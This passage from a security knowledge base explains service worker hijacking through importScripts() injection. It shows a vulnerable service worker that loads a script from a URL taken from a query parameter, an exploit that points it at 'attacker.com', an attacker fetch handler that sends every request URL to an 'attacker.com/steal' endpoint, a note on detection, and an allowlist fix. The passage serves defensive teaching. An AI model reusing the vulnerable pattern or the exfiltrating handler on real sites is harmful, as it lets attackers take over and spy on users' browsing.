---
source: "languages/javascript/service-worker-attacks.md"
title: "Service Worker Hijacking and Attacks"
category: "language-vuln"
language: "javascript"
chunk: 3
total_chunks: 10
heading: "Attack Vector 1: Service Worker Injection via importScripts()"
---

## Attack Vector 1: Service Worker Injection via importScripts()

**Source:** https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering

### The Vulnerability

Many SWs use `importScripts()` to load additional scripts. If the URL passed to `importScripts()` is influenced by query parameters, an attacker can inject malicious code.

### Vulnerable Pattern

```javascript
// sw.js — VULNERABLE service worker
const searchParams = new URLSearchParams(location.search);
const host = searchParams.get('host');

// Attacker controls 'host' parameter
self.importScripts(host + '/sw_extra.js');
// If host = "http://attacker.com"
// Loads: http://attacker.com/sw_extra.js
// Attacker now controls service worker's behavior
```

### Exploitation

```html
<!-- Attacker lures victim to: -->
<script>
navigator.serviceWorker.register('/sw.js?host=http://attacker.com');
</script>

<!-- The SW loads attacker's script via importScripts -->
<!-- attacker.com/sw_extra.js: -->
self.addEventListener('fetch', (event) => {
  // Intercept all requests, respond with attacker-controlled content
  event.respondWith(
    fetch('http://attacker.com/steal?url=' + encodeURIComponent(event.request.url))
  );
});
```

### Detection with DOM Invader

PortSwigger's DOM Invader tool can automatically detect Service Worker injection sinks:

```javascript
// DOM Invader looks for patterns like:
navigator.serviceWorker.register(urlWithQueryParam);

// It flags the sink "serviceWorker.register" with user-controlled input
```

### Secure Pattern

```javascript
// sw.js — SECURE service worker
// Validate and restrict importScripts URLs
const VALID_SCRIPTS = [
  '/sw/workbox.js',
  '/sw/analytics.js'
];

function getExtraScript() {
  const urlParams = new URLSearchParams(location.search);
  const script = urlParams.get('script');
  
  // Validate against allowlist
  if (VALID_SCRIPTS.includes(script)) {
    self.importScripts(script);
  }
}

getExtraScript();
```

**References:**
- https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering
- https://dl.acm.org/doi/fullHtml/10.1145/3427228.3427290 — Security Study of Service Worker XSS

---